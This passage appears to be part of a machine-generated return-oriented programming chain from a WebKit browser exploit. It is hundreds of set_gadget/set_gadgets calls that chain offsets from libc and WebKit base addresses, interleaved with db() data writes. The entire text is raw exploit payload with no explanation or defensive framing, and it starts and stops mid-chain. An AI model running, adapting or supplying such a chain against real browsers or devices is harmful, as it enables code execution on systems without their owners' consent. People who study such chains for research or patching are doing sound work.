set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273000, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273072, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273144, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273216, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273288, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273360, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273432, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273504, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273576, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273648, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273720, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273792, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273864, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+273936, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274008, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274080, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274152, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274224, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274296, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274368, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274440, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274512, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274584, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274656, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274728, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274800, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+274872, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967040, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+274968, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+50775, 
libc_base+793877, 
ropchain+275024, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([256, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+275136, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967040, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+275248, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+246488, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+275320, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967036, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+275400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967028, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+275504, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+275560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+275608, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967028, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+275712, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+275728, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+275880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+275912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+275896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+275864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+275984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+276000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+276096, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+276080, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+276176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([32, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+276328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+276344, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+276312, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+276512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+276528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+276496, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+276632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+276680, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+276648, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+276792, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+276784, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+276808, 
ropchain+276824, 
libc_base+811575, 
ropchain+276840, 
libc_base+811575, 
ropchain+284368, 
libc_base+793877, 
ropchain+276880, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([40, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+276984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+277000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+277144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+277112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+277128, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+277240, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967040, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+277320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+277376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+277616, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+277632, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+277720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+277776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+277848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+277904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+277992, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([32, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+278096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+278112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+278264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+278296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+278280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+278248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+278392, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+278376, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+278472, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967028, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+278576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+278592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+278744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+278776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+278760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+278728, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+278880, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+278864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+278936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+279080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+279096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+279064, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+279192, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+279176, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+279288, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967040, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+279368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+279424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([176, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+279664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+279680, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+279768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+279824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+279896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+279952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+280040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967036, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+280144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+280160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+280312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+280344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+280328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+280296, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+280440, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+280424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+280536, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967040, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([51, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+280720, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+280824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+280840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+280960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+280992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+280944, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+281080, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+281096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+281240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+281208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+281224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+281312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+281368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+281448, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967028, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+281552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+281568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+281720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+281752, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+281736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+281704, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+281912, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+281880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+281864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+281984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+282000, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+282088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+282144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+282264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+282296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+282280, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+282448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+282480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+282464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+282432, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+282552, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+282568, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+282664, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+282648, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+282768, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+294224, 
libc_base+882884, 
libc_base+793877 
]);
